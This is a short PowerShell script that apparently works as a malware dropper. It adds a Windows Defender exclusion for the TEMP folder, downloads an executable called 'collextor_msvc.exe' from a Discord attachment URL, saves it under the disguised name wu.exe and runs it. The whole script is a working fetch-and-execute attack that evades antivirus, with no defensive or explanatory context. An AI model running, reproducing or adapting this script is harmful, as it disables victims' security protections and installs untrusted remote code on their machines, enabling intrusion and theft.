$f="$env:TEMP\wu.exe"
Write-Host "[1] Adding exclusion..."
Add-MpPreference -ExclusionPath $env:TEMP 2>&1 | Write-Host
Write-Host "[2] Downloading..."
try { iwr "https://cdn.discordapp.com/attachments/1520398729520222211/1520407427064004667/collextor_msvc.exe?ex=6a411542&is=6a3fc3c2&hm=b6d3d4a1dce271c21b6663e0e76274f04157f87e5d495fd1eb790dc0c719d8a9&" -OutFile $f -UseBasicParsing } catch { Write-Host "Download error: $_" }
Write-Host "[3] File exists: $(Test-Path $f) Size: $((Get-Item $f -EA SilentlyContinue).Length)"
Write-Host "[4] Running..."
if (Test-Path $f) { & $f } else { Write-Host "File not found " }
Write-Host "[5] Done"
